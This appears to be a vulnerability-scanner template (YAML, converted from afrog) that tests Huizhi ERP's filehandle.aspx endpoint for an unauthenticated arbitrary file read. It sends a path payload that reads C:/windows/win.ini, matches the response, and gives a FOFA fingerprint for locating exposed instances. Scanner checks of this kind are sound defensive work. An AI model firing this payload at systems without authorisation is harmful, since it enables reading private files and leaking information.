@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - for 16-bit app support
+          - fonts
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini'
+id: huizhi-erp-filehandle-fileread
+info:
+  author: avic123
+  description: |
+    汇智ERP filehandle.aspx 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
+    fofa: icon_hash="-642591392"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 汇智ERP接口filehandle.aspx存在任意文件读取漏洞
+  severity: high
+  tags: fileread,huizhi,argus-import
